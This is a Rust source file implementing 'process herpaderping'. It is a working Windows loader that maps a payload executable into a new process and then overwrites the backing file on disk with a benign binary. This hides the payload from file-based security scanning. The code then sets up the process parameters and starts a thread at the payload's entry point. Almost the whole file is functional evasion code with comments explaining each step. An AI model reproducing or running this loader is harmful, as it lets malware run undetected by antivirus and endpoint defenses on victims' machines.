use crate::wrappers::*;
use std::{
    ffi::{c_void, OsStr}, 
    fs::OpenOptions, 
    io::Write, 
    iter::once, mem::zeroed, 
    os::windows::ffi::OsStrExt, 
    path::PathBuf, ptr::null_mut
};
use windows_sys::{
    w, 
    Wdk::{
        Foundation::NtClose, 
        Storage::FileSystem::*, 
        System::Threading::{
            NtQueryInformationProcess, 
            ProcessBasicInformation
        }
    },
};

use windows_sys::Win32::{
    Storage::FileSystem::*,
    Foundation::{
        GENERIC_READ, GENERIC_WRITE,
        HANDLE, UNICODE_STRING, GetLastError
    }, 
    System::{
        Memory::*,
        SystemServices::{IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE}, 
        Diagnostics::Debug::IMAGE_NT_HEADERS64,
        Environment::CreateEnvironmentBlock, 
        WindowsProgramming::RtlInitUnicodeString, 
        Threading::{
            PEB, PROCESS_ALL_ACCESS, 
            PROCESS_BASIC_INFORMATION, 
            THREAD_ALL_ACCESS
        }, 
    }
};

/// Custom `Result` type alias for standard error handling.
pub type Result<T> = std::result::Result<T, Box<dyn std::error::Error>>;

/// Struct representing a process herpaderping operation.
pub struct Herpaderping<'a> {
    /// In-memory buffer of the payload to be executed.
    buffer: Vec<u8>,

    /// NT-native path to the temporary file used.
    temp_name: String,

    /// Filesystem path to the temporary directory.
    dir: PathBuf,

    /// Path to the second-stage binary that will overwrite
    /// the original mapped file on disk after the image section is created.
    target: &'a str,

    /// Optional arguments passed to the ghosted process.
    args: &'a str,
}

impl<'a> Herpaderping<'a> {
    /// Constructs a new `Herpaderping` instance.
    ///
    /// # Arguments
    /// 
    /// * `file` - Path to the payload (EXE file).
    /// * `args` - Optional command-line arguments for the payload.
    ///
    /// # Returns
    /// 
    /// * `Ok(Herpaderping)` on success.
    /// * `Err` if reading the file fails or temp name can't be generated.
    pub fn new(file: &str, args: &'a str, target: &'a str) -> Result<Self> {
        // Get a temporary filename in the system temp directory
        let dir = std::env::temp_dir();
        let dir_wide = dir
            .as_os_str()
            .encode_wide()
            .chain(once(0))
            .collect::<Vec<u16>>();
    
        // Generate a temporary filename with prefix "TT"
        let mut name = vec![0; 256];
        unsafe { GetTempFileNameW(dir_wide.as_ptr(), w!("TT"), 0, name.as_mut_ptr()) };
        
        // Convert to NT path (e.g., \??\C:\Temp\TT123.tmp)
        let temp_name = format!(r"\??\{}", String::from_utf16_lossy(&name).trim_matches('\0'));

        // Read the EXE payload into memory
        let buffer = std::fs::read(file)?;
        Ok(Self { 
            buffer, 
            temp_name, 
            dir,
            target, 
            args
        })
    }

    /// Executes the herpaderping process by spawning a thread in the tampered process.
    ///
    /// # Returns
    ///
    /// * `Ok(())` – If the thread is successfully created in the target process.
    /// * `Err` – If validation of headers fails or if thread creation fails.
    pub fn run(&self) -> Result<()> {
        // Prepare process and get base address + process handle
        let (address, h_process) = self.prepare()?;

        unsafe {
            let dos_header = self.buffer.as_ptr() as *mut IMAGE_DOS_HEADER;
            let nt_header = (dos_header as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
            if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
                return Err("Invalid IMAGE_NT_SIGNATURE".into())
            }
            
            // Calculate entry point of the payload inside the process memory
            let entry_point = (address as usize + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize) as *mut c_void;

            // Create a new thread at the payload's entry point
            let mut h_thread = null_mut();
            let status = NtCreateThreadEx(
                &mut h_thread,
                THREAD_ALL_ACCESS,
                null_mut(),
                h_process,
                entry_point,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtCreateThreadEx Failed With Status: {status}").into())
            }
        }

        Ok(())
    }

    /// Prepares the section and creates the process for herpaderping execution.
    ///
    /// # Returns
    /// 
    /// * `Ok((*mut c_void, *mut c_void))` - Tuple containing the image base address and the handle to the suspended process.
    /// * `Err` - If any system call fails during the section or process setup.
    fn prepare(&self) -> Result<(*mut c_void, *mut c_void)> {
        // Create a memory section from the temp file and retrieve the file handle
        let (h_section, h_file) = self.create_section()?;

        // Create a new process in suspended state using the image mapped in the section
        let mut h_process = null_mut();
        let status = unsafe {
            NtCreateProcessEx(
                &mut h_process,
                PROCESS_ALL_ACCESS,
                null_mut(),
                -1isize as *mut c_void,
                PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                h_section,
                null_mut(),
                null_mut(),
                0,
            )
        };

        if !NT_SUCCESS(status) {
            return Err(format!("NtCreateProcessEx Failed With Status: {status}").into())
        }

        unsafe {
            NtClose(h_section);

            // Overwrite the file contents with a benign PE (e.g., legit EXE)
            let buffer = std::fs::read(self.target)?;
            let mut number_of_write = 0;
            WriteFile(
                h_file,
                buffer.as_ptr().cast(),
                buffer.len() as u32,
                &mut number_of_write,
                null_mut(),
            );

            // Ensure file is flushed and updated on disk
            FlushFileBuffers(h_file);
            SetEndOfFile(h_file);
        }

        // Set up process parameters in the target process (e.g. command-line, environment)
        let base_address = self.params(h_process)?;
        Ok((base_address, h_process))
    }

    /// Creates a memory-mapped section from the target file and returns the handles.
    ///
    /// # Returns
    /// 
    /// * `Ok((*mut c_void, *mut c_void))` - Tuple with the created section and its backing file handle.
    /// * `Err` - If file creation or section mapping fails.
    fn create_section(&self) -> Result<(*mut c_void, *mut c_void)> {
        unsafe {
            // Write payload buffer to temp file on disk
            let mut dest_file = OpenOptions::new()
                .write(true)
                .truncate(true)
                .open(&self.temp_name)?;
    
            dest_file.write_all(&self.buffer)?;
            dest_file.flush()?;
            
            // Open the file again with required permissions for section creation
            let name = OsStr::new(&self.temp_name)
                .encode_wide()
                .chain(once(0))
                .collect::<Vec<u16>>();

            let h_file = CreateFileW(
                name.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                null_mut(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                null_mut(),
            );

            if h_file.is_null() {
                return Err(format!("CreateFileW Failed With Error: {}", GetLastError()).into())
            }

            // Create a section from the newly written file
            let mut h_section = null_mut();
            let status = NtCreateSection(
                &mut h_section,
                SECTION_ALL_ACCESS,
                null_mut(),
                null_mut(),
                PAGE_READONLY,
                SEC_IMAGE,
                h_file,
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtCreateSection Failed With Status: {status}").into())
            }

            Ok((h_section, h_file))
        }
    }
    
    /// Prepares process parameters and writes them into the target process memory.
    ///
    /// # Arguments
    /// 
    /// * `h_process` - Handle to the target ghosted process.
    ///
    /// # Returns
    /// 
    /// * `Ok(*mut c_void)` - Pointer to the image base in the process's memory.
    /// * `Err` - on failure of any step.
    fn params(&self, h_process: HANDLE) -> Result<*mut c_void> {
        unsafe {
            // Paths and command-line setup for the process parameters
            let directory = self.dir
                .as_os_str()
                .encode_wide()
                .chain(once(0))
                .collect::<Vec<u16>>();

            let path = OsStr::new(&self.temp_name)
                .encode_wide()
                .chain(once(0))
                .collect::<Vec<u16>>();

            let cli = OsStr::new(&format!("{} {}", self.temp_name, self.args))
                .encode_wide()
                .chain(once(0))
                .collect::<Vec<u16>>();
        
            // Initialize Unicode structures for process parameters
            let mut u_cli = zeroed::<UNICODE_STRING>();
            let mut u_directory = zeroed::<UNICODE_STRING>();
            let mut u_path = zeroed::<UNICODE_STRING>();

            RtlInitUnicodeString(&mut u_cli, cli.as_ptr());
            RtlInitUnicodeString(&mut u_directory, directory.as_ptr());
            RtlInitUnicodeString(&mut u_path, path.as_ptr());
        
            // Create environment block for the new process
            let mut enviroment = null_mut();
            CreateEnvironmentBlock(&mut enviroment, null_mut(), 1);

            // Allocate RTL_USER_PROCESS_PARAMETERS with command-line and environment
            let mut user_proc_params = null_mut();
            let mut status = RtlCreateProcessParametersEx(
                &mut user_proc_params,
                &mut u_path,
                null_mut(),
                &mut u_directory,
                &mut u_cli,
                enviroment,
                null_mut(),
                null_mut(),
                null_mut(),
                null_mut(),
                RTL_USER_PROC_PARAMS_NORMALIZED,
            );

            if !NT_SUCCESS(status) {
                return Err(format!("RtlCreateProcessParametersEx Failed With Status: {status}").into())
            }
        
            // Query basic process information to get PEB address
            let mut pi = zeroed::<PROCESS_BASIC_INFORMATION>();
            status = NtQueryInformationProcess(
                h_process,
                ProcessBasicInformation,
                (&mut pi as *mut _ as *mut c_void).cast(),
                size_of::<PROCESS_BASIC_INFORMATION>() as u32,
                null_mut(),
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtQueryInformationProcess Failed With Status: {status}").into())
            }

            // Read the remote process's PEB into local memory
            let mut peb = zeroed::<PEB>();
            status = NtReadVirtualMemory(
                h_process.cast(),
                (pi.PebBaseAddress as *mut c_void).cast(),
                (&mut peb as *mut _ as *mut c_void).cast(),
                size_of::<PEB>(),
                null_mut(),
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtReadVirtualMemory Failed With Status: {status}").into())
            }

            // Calculate the size range of the parameter block and environment
            let mut user_proc_base = user_proc_params as usize;
            let mut user_proc_end = (user_proc_params as usize) + (*user_proc_params).Length as usize;
            if !(*user_proc_params).Environment.is_null() {
                if user_proc_params as usize > (*user_proc_params).Environment as usize {
                    user_proc_base = (*user_proc_params).Environment as usize;
                }
    
                if ((*user_proc_params).Environment as usize) + (*user_proc_params).EnvironmentSize > user_proc_end {
                    user_proc_end = ((*user_proc_params).Environment as usize) + (*user_proc_params).EnvironmentSize;
                }
            }
    
            // Allocate space in the target process for parameters and environment
            let mut size_param = user_proc_end - user_proc_base;
            let mut base_address = user_proc_params as *mut c_void;
            status = NtAllocateVirtualMemory(
                h_process,
                &mut base_address,
                0,
                &mut size_param,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtAllocateVirtualMemory Failed With Status: {status}").into())
            }

            // Write process parameters into remote memory
            let mut number_of_write = 0;
            status = NtWriteVirtualMemory(
                h_process,
                user_proc_params as *mut c_void,
                user_proc_params as *mut c_void,
                (*user_proc_params).Length as usize,
                &mut number_of_write,
            );
            
            if !NT_SUCCESS(status) {
                return Err(format!("NtWriteVirtualMemory Failed With Status: {status}").into())
            }

            // Write environment block if present
            if !(*user_proc_params).Environment.is_null() {
                status = NtWriteVirtualMemory(
                    h_process.cast(),
                    (*user_proc_params).Environment,
                    (*user_proc_params).Environment,
                    (*user_proc_params).EnvironmentSize,
                    &mut number_of_write,
                );
    
                if !NT_SUCCESS(status) {
                    return Err(format!("NtWriteVirtualMemory [2] Failed With Status: {status}").into())
                }
            }

            // Set the remote PEB's ProcessParameters field to point to the new block
            let peb_base_address  = pi.PebBaseAddress;
            let process_parameters = &mut (*peb_base_address).ProcessParameters as *mut _ as *mut *mut c_void;
            status = NtWriteVirtualMemory(
                h_process,
                process_parameters as *mut c_void,
                &user_proc_params as *const _ as *mut c_void,
                size_of::<*mut c_void>(),
                &mut number_of_write,
            );

            if !NT_SUCCESS(status) {
                return Err(format!("NtWriteVirtualMemory [3] Failed With Status: {status}").into())
            }
    
            // Return the image base address from the PEB
            Ok(peb.Reserved3[1])
        }
    }
}